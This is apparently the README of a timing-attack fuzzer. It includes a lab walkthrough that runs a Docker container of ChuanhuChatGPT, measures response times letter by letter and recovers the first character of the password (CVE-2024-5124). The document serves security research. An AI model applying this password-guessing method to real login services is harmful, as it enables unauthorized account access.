## I Tutorials:

# I.1/ Build modular-timing-fuzzer

Install dependencies

```bash
virtualenv -p python3 venv3 ;
source venv3/bin/activate &&

pip install argparse requests matplotlib scipy pandas
```

Then run:

```bash
python3 -m pip install build && 
python3 -m build &&
python3 -m pip install -e . &&
python3 -m pip install dist/modular_time_fuzzer_GOGO-0.0.1-py3-none-any.whl --force-reinstall
```

# I.2/ Install From Pypi

Run simply:

```bash
pip install modular-time-fuzzer
```


# I.3/ Usage

`measure` command line permits to choose inputs that will be recorded to the database.
`analyze` command line permits to represent the data collected to a picture graph.

```bash
measure -r 10 -c a -c b -c c -c d -c e -c f -c g -c h -c i -c j -c k -c l -c m -c n -c o -c p -c q -c r -c s -c t -c u -c v -c w -c x -c y -c z "out.sqlite"
analyze -c a -c b -c c -c d -c e -c f -c g -c h -c i -c j -c k -c l -c m -c n -c o -c p -c q -c r -c s -c t -c u -c v -c w -c x -c y -c z "out.sqlite"
```


At any moment, you could run sql query on the database in order to determine for example wich request is noised: `sqlite3 "out.sqlite"`.

then, you could see how much requests you considere as not noised for a single input character with:

```bash
SELECT COUNT(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'a' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
```

and read any with:

```bash
SELECT TIME_TAKEN / 1000000.0 FROM REQUEST WHERE REQUEST.INPUT = 'a' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
```

and finally, you can have the means / median with:

```bash
SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'a' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
```

```bash
sqlite> SELECT COUNT(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'a' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
90
sqlite> SELECT TIME_TAKEN / 1000000.0 FROM REQUEST WHERE REQUEST.INPUT = 'a' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
404.645166
408.052166
409.414739
409.688138
398.191623
408.52954
408.556281
399.634207
400.947555
403.563834
404.68618
397.617568
399.634716
...
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'a' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
403.772096966667
```



```bash
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'a' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
403.772096966667
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'b' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
403.931148813954
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'c' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
403.089933771739
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'd' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
403.492285518519
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'e' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
403.033290575
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'f' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
403.71726626506
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'g' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
403.437231684783
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'h' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
403.725036652174
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'i' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
404.370431755556
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'j' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
403.756156428571
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'k' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
403.999579357895
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'l' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
404.017877922222
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'm' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
403.549548329897
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'n' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
402.352477635294
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'o' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
404.535095189873
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'p' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
403.752988655556
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'q' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
403.976769318681
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'r' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
403.206678616279
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'r' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
403.206678616279
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 's' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
404.222930974683
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 't' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
403.738821797753
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'u' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
403.868063326316
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'v' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
403.026525931507
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'w' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
403.05889452439
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'x' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
403.3773351
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'y' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
403.161335746835
sqlite> SELECT AVG(TIME_TAKEN / 1000000.0) FROM REQUEST WHERE REQUEST.INPUT = 'z' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 ;
402.963481670886
sqlite>
```

## II How-to:

# II.1/ developping timing attack against the password verification of Chuanchuangpt (CVE-2024-5124) using a cloud service in background

# II.1.1/ Deploy victim server:

# Install docker

```bash
# Install packages required for the installation

sudo apt-get update
sudo apt install --yes ca-certificates curl
sudo install -m 0755 -d /etc/apt/keyrings
sudo curl -fsSL https://download.docker.com/linux/debian/gpg -o /etc/apt/keyrings/docker.asc
sudo chmod a+r /etc/apt/keyrings/docker.asc

# Add the repository to Apt sources:

echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/debian \
  $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
sudo apt-get update
# Download GPG key and store repository in the system

curl -fsSL https://download.docker.com/linux/debian/gpg | gpg --dearmor -o /usr/share/keyrings/docker.gpg
echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable" |tee /etc/apt/sources.list.d/docker.list > /dev/null 
apt update 

# Install Docker packages

sudo apt install --yes docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
```

# Run victim server

```bash
export JSON='{
    "users": [["openai", "isCloseAi"]]
}' ;

export DOCKER_CMD="apt update && apt install --yes git && pip install itsdangerous gradio && echo '${JSON}' > config.json && sed -i 's/share=share/share=True/g' ChuanhuChatbot.py && python3 -u ChuanhuChatbot.py 2>&1 | tee /var/log/application.log"

export DOCKER_RUN='sudo docker run -e language=en_US -it tuchuanhuhuhu/chuanhuchatgpt:20240310 /bin/bash -c "${DOCKER_CMD}"'

tmux new-session -d -s persistent_server "${DOCKER_RUN}"
tmux attach -t persistent_server
```

## II.1.2/ Attack the victim server

If you want to run these two scripts

```bash
measure -r 1000 -c a -c b -c c -c d -c e -c f -c g -c h -c i -c j -c k -c l -c m -c n -c o -c p -c q -c r -c s -c t -c u -c v -c w -c x -c y -c z "out.sqlite"
analyze -c a -c b -c c -c d -c e -c f -c g -c h -c i -c j -c k -c l -c m -c n -c o -c p -c q -c r -c s -c t -c u -c v -c w -c x -c y -c z "out.sqlite"
```

On a cloud backend to ensure it will never exit, install previously mentionned dependencies and run:

```bash
tmux new-session -d -s persistent_session "source ./venv3/bin/activate && rm -Rf mkdir tmpdir/ && mkdir tmpdir/ ; measure -r 1000 -c a -c b -c c -c d -c e -c f -c g -c h -c i -c j -c k -c l -c m -c n -c o -c p -c q -c r -c s -c t -c u -c v -c w -c x -c y -c z 'out.sqlite' && analyze -c a -c b -c c -c d -c e -c f -c g -c h -c i -c j -c k -c l -c m -c n -c o -c p -c q -c r -c s -c t -c u -c v -c w -c x -c y -c z 'out.sqlite'"
tmux attach -t persistent_session
```

# II.2/ sort requests time to remove noise

Collect request time with:

```bash
measure -r 250 -c a -c b -c c -c d -c e -c f -c g -c h -c i -c j -c k -c l -c m -c n -c o -c p -c q -c r -c s -c t -c u -c v -c w -c x -c y -c z "out.sqlite"
```

and remove useless requests time with an sql `SELECT` as:

```bash
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 'a' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
403.29338264
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 'b' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
403.84131522
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 'c' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
402.43731188
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 'd' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
403.42710264
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 'e' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
402.48978454
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 'f' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
403.42193462
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 'g' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
403.36167422
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 'h' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
403.53887338
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 'i' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
404.3959109
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 'j' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
402.95281052
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 'k' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
404.19743928
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 'l' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
403.54544896
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 'm' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
404.22916374
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 'n' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
402.51589022
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 'o' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
404.22868972
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 'p' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
402.92633284
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 'q' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
403.9932122
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 'r' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
402.32433204
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 's' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
404.15611828
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 't' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
403.67483828
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 'u' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
404.1932835
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 'v' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
402.6236638
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 'w' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
402.60065776
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 'x' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
403.24132508
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 'y' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
403.43390054
sqlite> SELECT AVG (TIME_TAKEN / 1000000.0) FROM (SELECT TIME_TAKEN FROM REQUEST WHERE REQUEST.INPUT = 'z' AND (REQUEST.TIME_TAKEN / 1000000.0) < 410 LIMIT 50) ;
403.4237106
sqlite
```

The greatest average request set took 404.4 ms that corresponds exactly to the `i` and it is exactly the right good first character! We just found the first character!


# III/ API reference for developpers

# IV/ Why using a modular timing attack fuzzer?

Trough there are a lot of similar tool for recording request time such as `tlsfuzzer` or `timeinator`, none of them provide enough flexibility to let the user record it own timing with modularity.

`modular-timing-fuzzer` then has chosen to let the user to script the recording interface in a modular way and then use the output recorded to interpret in in a less but still modular way.

# IV.1 / attacks against passwords authentication with unsecure crypto comparison.

# IV.2 / attacks against assymetric encryption algorithms.

